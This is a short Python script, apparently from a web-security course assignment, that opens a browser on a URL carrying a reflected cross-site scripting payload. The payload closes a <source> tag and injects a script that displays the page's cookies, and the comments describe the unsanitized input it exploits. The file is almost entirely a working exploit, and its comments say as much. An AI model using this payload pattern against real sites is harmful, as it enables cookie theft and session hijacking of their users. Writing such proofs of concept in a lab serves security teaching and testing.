import webbrowser

# Exploit: reflected XSS in the user input that is not sanitized on the server-side
# User input closes off the <source src=""> tag and injects a <script> tag

def main():
    webbrowser.open('http://wsb.com/Assignment2/case15.php?videourl=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C!--&Display=Display+', 2)

if __name__ == "__main__":
    main()
